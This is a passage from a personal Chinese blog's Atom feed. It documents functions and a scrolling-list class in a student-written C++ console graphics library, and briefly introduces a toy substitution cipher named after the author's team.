执行后方框会集中在左上角，wasd和ijkl分别控制方框的左上角和右下角，如果发生诡异的显示状况，可能是右下角不再是右下角导致的。<br>建议在使用的时候先控制右下角远离左上角。</p><p>按下<strong>[ENTER]</strong>预览生成效果，再按一次回到移动模式。按下<strong>[TAB]</strong>键可以隐藏方框，再按一次显示方框。</p><h1 id="输入限制函数ENTER"><a href="#输入限制函数ENTER" class="headerlink" title="输入限制函数ENTER"></a>输入限制函数ENTER</h1><p>这个函数在写图形界面时非常实用。<br>如果使用cin接收用户输入的话，用户可以通过输入换行和空格破坏画面。<br>使用ENTER函数就可以限制用户的输入。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ENTER(H_Gray,<span class="number">5</span>,<span class="number">7</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">//指定颜色为白色，在（5，7）的位置输入，并最长为10个字符超过会闪红色。</span></span><br></pre></td></tr></table></figure></div><p>但是并不能正确处理宽字节，也就无法输入中文。<br>后续的更新会解决这个问题。</p><h1 id="SCROLL-LIST类"><a href="#SCROLL-LIST类" class="headerlink" title="SCROLL_LIST类"></a>SCROLL_LIST类</h1><p>SCROLL_LIST是一个可以生成滚动信息栏的类</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand code-closed" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">SCROLL_LIST <span class="title">TestList</span><span class="params">(<span class="number">5</span>, <span class="number">5</span>, <span class="number">40</span>, <span class="number">7</span>)</span></span>;</span><br><span class="line">TestList.title = <span class="string">"信息栏"</span>;</span><br><span class="line">TestList.TitleColor = H_Yellow;</span><br><span class="line">TestList.DRAW(H_Blue);</span><br><span class="line">TestList.CREATERECORD(H_Green, <span class="string">"Hello World!"</span>);</span><br><span class="line">TestList.CREATERECORD(H_GreenBlue, <span class="string">"[N0P3]:"</span>, H_Gray, <span class="string">"Hello World!"</span>, H_Green, <span class="string">"   --OK"</span>);</span><br><span class="line"><span class="comment">//最后看起来很长的代码其实非常简单</span></span><br></pre></td></tr></table></figure></div><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.49.png" data-fancybox="group" data-caption="滚动信息栏" class="fancybox"><img alt="滚动信息栏" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.49.png" class="lazyload" title="滚动信息栏"></a><br>//又觉得丑(?）还是可以自定义颜色和符号</p><p>滚动信息栏的使用设计和选单很不一样。</p><h2 id="主要成员变量-1"><a href="#主要成员变量-1" class="headerlink" title="主要成员变量"></a>主要成员变量</h2><p><strong>字符串（string）：</strong><br>信息栏标题<strong>title</strong><br>构成信息栏边框的字符<strong>Str</strong></p><p><strong>整型 (int):</strong><br>信息栏左上角坐标<strong>x,y</strong><br>选单标题的颜色<strong>TitleColor</strong><br>信息栏的长度（每行最多显示的长度）<strong>StrLimit</strong><br>信息栏的高度（最多显示多少行）<strong>MaxNum</strong></p><h2 id="成员函数-1"><a href="#成员函数-1" class="headerlink" title="成员函数"></a>成员函数</h2><p><strong>信息栏绘制函数DRAW：</strong><br>提供一个颜色参数，在控制台打印出信息栏的外框<br>无返回值。</p><p><strong>清空函数CLEAR：</strong><br>不需要参数，调用后清理信息栏所在的位置<br>无返回值。</p><p><strong>创造记录函数CREATERECORD</strong><br>创造纪录函数的参数最多为六个，<br>分为三组，每组由颜色和字符串两个参数组成。<br>按顺序称为记录的第一部分，第二部分和第三部分。<br>上面截图的第一条记录只用到了一个部分。<br>第二条用到了三部分。<br>第一部分通常起提示的作用，所以后两个部分如果过长会自动换行并与第一部分对齐。<br><em>现在中文换行可能会出现乱码，后续的更新会解决这个问题。</em><br><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.09.png" data-fancybox="group" data-caption="换行演示" class="fancybox"><img alt="换行演示" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/%E6%88%AA%E5%B1%8F2020-02-10%E4%B8%8B%E5%8D%888.20.09.png" class="lazyload" title="换行演示"></a><br>在实例化一个滚动信息栏对象后，<br>在程序的任何位置调用此函数就能立即在信息栏输出信息。信息过长会自动换行，超过显示的上限会滚动显示。</p><p><strong>滚动函数ROLL</strong><br>两个颜色参数分别指定信息栏外框的颜色和光标指针的颜色。<br>按ws来控制光标上下移动，光标到顶端或底部后继续向上或向下信息栏会开始滚动。<br>按下[ENTER]会返回光标所在的行数。行数从0开始向下递增。<br>按[ESC]返回-1；<br><strong>播放函数DISPLAY</strong><br>提供开始和结束的行数，信息栏就会显示这一段信息。<em>播放不存在的信息会访问到非法内存</em><br><strong>获得记录函数GETRECORD</strong><br>提供行数返回一个RECORD对象。<br><em>直接对信息栏中的信息进行操作可能会导致访问非法内存等问题</em></p><h2 id="END"><a href="#END" class="headerlink" title="END"></a>END</h2><p>XzyGraphics库只是我在大一时方便自己写程序的工具，分享出来帮助和我一样正在学习的人创造更好看的命令行界面。<em>(它用起来真的很简单!)</em>它的不足和缺点还有很多，我也会坚持继续更新。如果你有建议或问题，发送邮件至<a href="mailto:n0p3@nyist.edu.cn">n0p3@nyist.edu.cn</a>。<br>感谢你花时间来阅读我的第一篇博客。：）</p><h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/XzyGraphics%5B2.2%5D.zip" target="_blank" rel="noopener">XzyGraphics库</a></p>]]></content>
    
    <summary type="html">
    
      一个方便写控制台程序的库
    
    </summary>
    
    
    
      <category term="C++" scheme="https://cdn.n0p3.cn/tags/C/"/>
    
      <category term="Windows" scheme="https://cdn.n0p3.cn/tags/Windows/"/>
    
      <category term="图形" scheme="https://cdn.n0p3.cn/tags/%E5%9B%BE%E5%BD%A2/"/>
    
  </entry>
  
  <entry>
    <title>NYSEC密码</title>
    <link href="https://cdn.n0p3.cn/2020/02/10/NYSEC%E5%AF%86%E7%A0%81/"/>
    <id>https://cdn.n0p3.cn/2020/02/10/NYSEC%E5%AF%86%E7%A0%81/</id>
    <published>2020-02-10T11:06:46.000Z</published>
    <updated>2020-05-23T08:34:56.243Z</updated>
    
    <content type="html"><![CDATA[<p>前两天得知猪圈密码居然还有皮肤版</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/029E344D37AF3D5305AEA510BE32B8A9.jpg" data-fancybox="group" data-caption="圣堂武士密码" class="fancybox"><img alt="圣堂武士密码" data-src="https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/029E344D37AF3D5305AEA510BE32B8A9.jpg" class="lazyload" title="圣堂武士密码"></a></p><p>顿时觉得真是什么都能设计个密码出来。</p><p>于是我就搞了个NYSEC密码。</p><p>NYSEC是我们战队的名字，密文中也只出现了这五个字母。</p><p><a href="https://n0p3.oss-cn-beijing.aliyuncs.com/source/NYSEC-CODE.zip" target="_blank" rel="noopener">NYSEC编解码程序</a></p><p>Cover: Unsplash @jn1434</p>]]></content>
    
    <summary type="html">
    
      简单的密码学
    
    </summary>
    
    
    
      <category term="密码" scheme="https://cdn.n0p3.cn/tags/%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
</feed>
